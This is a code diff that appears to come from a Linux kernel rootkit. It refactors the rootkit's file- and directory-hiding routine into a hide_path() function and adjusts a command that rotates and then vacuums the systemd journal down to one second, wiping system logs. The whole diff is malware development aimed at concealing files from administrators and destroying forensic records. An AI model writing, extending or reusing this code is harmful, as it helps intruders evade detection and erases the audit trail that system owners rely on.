@@ -528,6 +528,32 @@ static void _run_send_sig(int sig, pid_t pid, bool restart)
 	}
 }
 
+static void hide_path(const char *s)
+{
+	struct path path;
+	struct kstat stat = { 0 };
+
+	if (fs_kern_path(s, &path) && fs_file_stat(&path, &stat)) {
+		/** It is filename, no problem because we have path.dentry */
+		const char *f = kstrdup(path.dentry->d_name.name, GFP_KERNEL);
+		bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
+
+		if (is_dir) {
+			u64 parent_inode = fs_get_parent_inode(&path);
+			fs_add_name_rw_dir(f, stat.ino, parent_inode,
+					   /*is_dir=*/true);
+		} else {
+			fs_add_name_rw(f, stat.ino);
+		}
+
+		path_put(&path);
+		kv_mem_free(&f);
+	} else if (*s != '.' && *s != '/') {
+		/** add with unknown inode number */
+		fs_add_name_rw(s, /*ino=*/0);
+	}
+}
+
 #define CMD_MAXLEN 128
 static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			loff_t *offset)
@@ -587,31 +613,7 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 		case Opt_hide_file:
 		case Opt_hide_directory: {
 			char *s = args[0].from;
-			struct kstat stat = { 0 };
-			struct path path;
-
-			if (fs_kern_path(s, &path) &&
-			    fs_file_stat(&path, &stat)) {
-				/** It is filename, no problem because we have path.dentry */
-				const char *f = kstrdup(
-					path.dentry->d_name.name, GFP_KERNEL);
-				bool is_dir = ((stat.mode & S_IFMT) == S_IFDIR);
-
-				if (is_dir) {
-					u64 parent_inode =
-						fs_get_parent_inode(&path);
-					fs_add_name_rw_dir(f, stat.ino,
-							   parent_inode,
-							   is_dir);
-				} else {
-					fs_add_name_rw(f, stat.ino);
-				}
-				path_put(&path);
-				kv_mem_free(&f);
-			} else if (*s != '.' && *s != '/') {
-				/** add with unknown inode number */
-				fs_add_name_rw(s, stat.ino);
-			}
+			hide_path(s);
 		} break;
 		case Opt_unhide_file:
 		case Opt_unhide_directory:
@@ -628,9 +630,9 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			break;
 		case Opt_journalclt: {
 			char *cmd[] = { JOURNALCTL, "--rotate", NULL };
-			if (!kv_run_system_command(cmd)) {
+			if (!kv_run_system_command(cmd, false, false)) {
 				cmd[1] = "--vacuum-time=1s";
-				kv_run_system_command(cmd);
+				kv_run_system_command(cmd, false, false);
 			}
 		} break;
 #ifdef DEBUG_RING_BUFFER
